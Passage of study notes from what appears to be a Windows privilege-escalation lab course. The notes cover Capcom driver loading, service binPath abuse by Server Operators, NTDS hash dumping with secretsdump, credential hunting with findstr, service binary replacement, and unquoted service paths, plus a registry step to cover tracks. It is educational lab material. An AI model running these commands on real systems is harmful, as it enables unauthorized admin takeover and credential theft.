[+] Enabling SeLoadDriverPrivilege
[+] SeLoadDriverPrivilege Enabled
[+] Loading Driver: \Registry\User\S-1-5-21-454284637-3659702366-2958135535-1103\System\CurrentControlSet\Capcom
NTSTATUS: c000010e, WinError: 0
```

We would then run `ExploitCapcom.exe` to pop a SYSTEM shell or run our custom binary.

* * *

## Clean-up

#### Removing Registry Key

We can cover our tracks a bit by deleting the registry key added earlier.

Print Operators

```cmd-session
C:\local> reg delete HKCU\System\CurrentControlSet\Capcom

Permanently delete the registry key HKEY_CURRENT_USER\System\CurrentControlSet\Capcom (Yes/No)? Yes

The operation completed successfully.
```

Note: Since Windows 10 Version 1803, the "SeLoadDriverPrivil

&nbsp;

&nbsp;

&nbsp;

# Server Operators

* * *

The [Server Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators) group allows members to administer Windows servers without needing assignment of Domain Admin privileges. It is a very highly privileged group that can log in locally to servers, including Domain Controllers.

Membership of this group confers the powerful `SeBackupPrivilege` and `SeRestorePrivilege` privileges and the ability to control local services.

#### Querying the AppReadiness Service

Let's examine the `AppReadiness` service. We can confirm that this service starts as SYSTEM using the `sc.exe` utility.

Server Operators

```cmd-session
C:\local> sc qc AppReadiness

[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: AppReadiness
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\System32\svchost.exe -k AppReadiness -p
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : App Readiness
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

#### Checking Service Permissions with PsService

We can use the service viewer/controller [PsService](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice), which is part of the Sysinternals suite, to check permissions on the service. `PsService` works much like the `sc` utility and can display service status and configurations and also allow you to start, stop, pause, resume, and restart services both locally and on remote hosts.

Server Operators

```cmd-session
C:\local> c:\Tools\PsService.exe security AppReadiness

PsService v2.25 - Service information and configuration utility
Copyright (C) 2001-2010 Mark Russinovich
Sysinternals - www.sysinternals.com

SERVICE_NAME: AppReadiness
DISPLAY_NAME: App Readiness
        ACCOUNT: LocalSystem
        SECURITY:
        [ALLOW] NT AUTHORITY\SYSTEM
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                Pause/Resume
                Start
                Stop
                User-Defined Control
                Read Permissions
        [ALLOW] BUILTIN\Administrators
                All
        [ALLOW] NT AUTHORITY\INTERACTIVE
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                User-Defined Control
                Read Permissions
        [ALLOW] NT AUTHORITY\SERVICE
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                User-Defined Control
                Read Permissions
        [ALLOW] BUILTIN\Server Operators
                All
```

This confirms that the Server Operators group has [SERVICE_ALL_ACCESS](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) access right, which gives us full control over this service.

#### Checking Local Admin Group Membership

Let's take a look at the current members of the local administrators group and confirm that our target account is not present.

Server Operators

```cmd-session
C:\local> net localgroup Administrators

Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
The command completed successfully.
```

#### Modifying the Service Binary Path

Let's change the binary path to execute a command which adds our current user to the default local administrators group.

Server Operators

```cmd-session
C:\local> sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"

[SC] ChangeServiceConfig SUCCESS
```

#### Starting the Service

Starting the service fails, which is expected.

Server Operators

```cmd-session
C:\local> sc start AppReadiness

[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.
```

#### Confirming Local Admin Group Membership

If we check the membership of the administrators group, we see that the command was executed successfully.

Server Operators

```cmd-session
C:\local> net localgroup Administrators

Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
server_adm
The command completed successfully.
```

#### Confirming Local Admin Access on Domain Controller

From here, we have full control over the Domain Controller and could retrieve all credentials from the NTDS database and access other systems, and perform post-exploitation tasks.

Server Operators

```shell-session
cube111@local[/local]$ crackmapexec smb 10.129.43.9 -u server_adm -p 'local_@cademy_stdnt!'

SMB         10.129.43.9     445    WINLPE-DC01      [*] Windows 10.0 Build 17763 (name:WINLPE-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.43.9     445    WINLPE-DC01      [+] INLANEFREIGHT.LOCAL\server_adm:local_@cademy_stdnt! (Pwn3d!)
```

#### Retrieving NTLM Password Hashes from the Domain Controller

Server Operators

```shell-session
cube111@local[/local]$ secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator

Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:5db9c9ada113804443a8aeb64f500cd3e9670348719ce1436bcc95d1d93dad43
Administrator:aes128-cts-hmac-sha1-96:94c300d0e47775b407f2496a5cca1a0a
Administrator:des-cbc-md5:d60dfbbf20548938
[*] Cleaning up...
```

&nbsp;

&nbsp;

&nbsp;

&nbsp;credential hunting

```
findstr /SIM /C:"pass" *.ini *.cfg *.config *.xml
```

&nbsp;

IF u get a netwrok or sservice local account can escalate and get seimpersonate priv

https://github.com/itm4n/FullPowers

&nbsp;

# Weak Permissions-SERVICE BINARY HIJACKING

&nbsp;

```powershell-session
PS C:\local> .\SharpUp.exe audit

=== SharpUp: Running Privilege Escalation Checks ===


=== Modifiable Service Binaries ===

  Name             : SecurityService
  DisplayName      : PC Security Management Service
  Description      : Responsible for managing PC security
  State            : Stopped
  StartMode        : Auto
  PathName         : "C:\Program Files (x86)\PCProtect\SecurityService.exe"
  
  <SNIP>
```

&nbsp;

&nbsp;

#### Checking Permissions with icacls

Using [icacls](https://ss64.com/nt/icacls.html) we can verify the vulnerability and see that the `EVERYONE` and `BUILTIN\Users` groups have been granted full permissions to the directory, and therefore any unprivileged system user can manipulate the directory and its contents.

Weak Permissions

```powershell-session
PS C:\local> icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"

C:\Program Files (x86)\PCProtect\SecurityService.exe BUILTIN\Users:(I)(F)
                                                     Everyone:(I)(F)
                                                     NT AUTHORITY\SYSTEM:(I)(F)
                                                     BUILTIN\Administrators:(I)(F)
                                                     APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                                     APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

&nbsp;

&nbsp;

#### Replacing Service Binary

This service is also startable by unprivileged users, so we can make a backup of the original binary and replace it with a malicious binary generated with `msfvenom`. It can give us a reverse shell as `SYSTEM`, or add a local admin user and give us full administrative control over the machine.

Weak Permissions

```cmd-session
C:\local> cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
C:\local> sc start SecurityService
```

&nbsp;

&nbsp;

## Weak Service Permissions

&nbsp;

#### Reviewing SharpUp Again

Let's check the `SharpUp` output again for any modifiable services. We see the `WindscribeService` is potentially misconfigured.

Weak Permissions

```cmd-session
C:\local> SharpUp.exe audit
 
=== SharpUp: Running Privilege Escalation Checks ===
 
 
=== Modifiable Services ===
 
  Name             : WindscribeService
  DisplayName      : WindscribeService
  Description      : Manages the firewall and controls the VPN tunnel
  State            : Running
  StartMode        : Auto
  PathName         : "C:\Program Files (x86)\Windscribe\WindscribeService.exe"
```

&nbsp;

&nbsp;

#### Checking Permissions with AccessChk

Next, we'll use [AccessChk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) from the Sysinternals suite to enumerate permissions on the service. The flags we use, in order, are `-q` (omit banner), `-u` (suppress errors), `-v` (verbose), `-c` (specify name of a Windows service), and `-w` (show only objects that have write access). Here we can see that all Authenticated Users have [SERVICE_ALL_ACCESS](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) rights over the service, which means full read/write control over it.

Weak Permissions

```cmd-session
C:\local> accesschk.exe /accepteula -quvcw WindscribeService
 
Accesschk v6.13 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2020 Mark Russinovich
Sysinternals - www.sysinternals.com
 
WindscribeService
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  RW BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  RW NT AUTHORITY\Authenticated Users
        SERVICE_ALL_ACCESS
```

&nbsp;

&nbsp;

#### Changing the Service Binary Path

We can use our permissions to change the binary path maliciously. Let's change it to add our user to the local administrator group. We could set the binary path to run any command or executable of our choosing (such as a reverse shell binary).

Weak Permissions

```cmd-session
C:\local> sc config WindscribeService binpath="cmd /c net localgroup administrators local-student /add"

[SC] ChangeServiceConfig SUCCESS
```

&nbsp;

&nbsp;

&nbsp;

#### Stopping Service

Next, we must stop the service, so the new `binpath` command will run the next time it is started.

Weak Permissions

```cmd-session
C:\local> sc stop WindscribeService
 
SERVICE_NAME: WindscribeService
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x4
        WAIT_HINT          : 0x0
```

#### Starting the Service

Since we have full control over the service, we can start it again, and the command we placed in the `binpath` will run even though an error message is returned. The service fails to start because the `binpath` is not pointing to the actual service executable. Still, the executable will run when the system attempts to start the service before erroring out and stopping the service again, executing whatever command we specify in the `binpath`.

Weak Permissions

```cmd-session
C:\local> sc start WindscribeService

[SC] StartService FAILED 1053:
 
The service did not respond to the start or control request in a timely fashion.
```

#### Confirming Local Admin Group Addition

Finally, check to confirm that our user was added to the local administrators group.

Weak Permissions

```cmd-session
C:\local> net localgroup administrators

Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain
 
Members
 
-------------------------------------------------------------------------------
Administrator
local-student
mrb3n
The command completed successfully.
```

&nbsp;

&nbsp;

&nbsp;

## Unquoted Service Path

#### Service Binary Path

```shell-session
C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
```

Windows will decide the execution method of a program based on its file extension, so it's not necessary to specify it. Windows will attempt to load the following potential executables in order on service start, with a .exe being implied:

- `C:\Program`
- `C:\Program Files`
- `C:\Program Files (x86)\System`
- `C:\Program Files (x86)\System Explorer\service\SystemExplorerService64`

&nbsp;

#### Searching for Unquoted Service Paths

We can identify unquoted service binary paths using the command below.

```cmd-session
C:\local> wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
GVFS.Service                                                                        GVFS.Service                              C:\Program Files\GVFS\GVFS.Service.exe                                                 Auto
System Explorer Service                                                             SystemExplorerHelpService                 C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe             Auto
WindscribeService                                                                   WindscribeService                         C:\Program Files (x86)\Windscribe\WindscribeService.exe                                  Auto
```

&nbsp;

#### Querying Service

```cmd-session
C:\local> sc qc SystemExplorerHelpService

[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: SystemExplorerHelpService
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Explorer Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;